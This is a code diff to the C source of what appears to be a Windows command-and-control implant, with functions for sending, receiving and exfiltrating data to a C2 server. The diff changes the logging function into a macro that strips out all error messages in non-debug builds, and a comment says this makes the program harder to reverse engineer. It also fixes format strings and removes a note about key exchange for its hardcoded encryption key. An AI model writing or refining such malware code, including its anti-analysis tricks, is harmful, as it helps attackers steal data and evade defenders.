@@ -54,11 +54,19 @@ char* unbase64(char* buffer, int len, int* outLen);
 char* Encrypt(char* msg, int len, int* pOutLen);
 char* Decrypt(char* ciphertext, int len, int* pOutLen);
 
-void c2_log(const char* format, ...);
 int c2_send(char* buffer, int len);
 int c2_send_body(char* buffer, int len);
 int c2_recv(char* buffer, int len);
 int c2_exfil(char* data, int len);
+
+// Conditionally compile logging function only when debug flag is set.
+// This will make the program harder to reverse engineer since it won't have
+// error messages anywhere.
+#ifdef DEBUG
+#define c2_log(format, ...) printf(format, __VA_ARGS__)
+#else
+#define c2_log(format, ...)
+#endif
 // -----------------------------------------------------------------------
 
 
@@ -172,7 +180,6 @@ int SetupHTTP() {
 
 
 // Set up encryption context and algos.
-// TODO: maybe negotioate Diffie-Hellman key exchange rather than hardcoding key
 int SetupCrypto() {
     NTSTATUS status;
 
@@ -236,7 +243,7 @@ char* base64(char* bytes, int len) {
     // Now call for real with proper size
     if (! CryptBinaryToString(bytes, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, result, &size)) {
         Free(result);
-        c2_log("[!] base64:CryptBinaryToString failed with status %s\n", GetLastError());
+        c2_log("[!] base64:CryptBinaryToString failed with status %d\n", GetLastError());
         return NULL;
     }
 
@@ -260,7 +267,7 @@ char* unbase64(char* buffer, int len, int* outLen) {
     // Now call for real with proper size
     if (! CryptStringToBinary(buffer, len, CRYPT_STRING_BASE64, result, &size, NULL, NULL)) {
         Free(result);
-        c2_log("[!] base64:CryptStringToBinary failed with status %s\n", GetLastError());
+        c2_log("[!] base64:CryptStringToBinary failed with status %d\n", GetLastError());
         return NULL;
     }
     *outLen = size;
@@ -329,24 +336,6 @@ char* Decrypt(char* ciphertext, int len, int* pOutLen) {
 // =========================================================================
 // ============================ COMMS FUNCTIONS ============================
 // =========================================================================
-
-// Conditionally compile logging function only when debug flag is set.
-// This will make the program harder to reverse engineer since it won't have
-// error messages anywhere.
-#ifdef DEBUG
-void c2_log(const char* format, ...) {
-    va_list args;
-    int ret;
-
-    va_start(args, format);
-    vprintf(format, args);
-    va_end(args);
-}
-#else
-void c2_log(const char* format, ...) {
-    return;
-}
-#endif
 
 
 // Sends data to C2 server in body of  HTTP request.
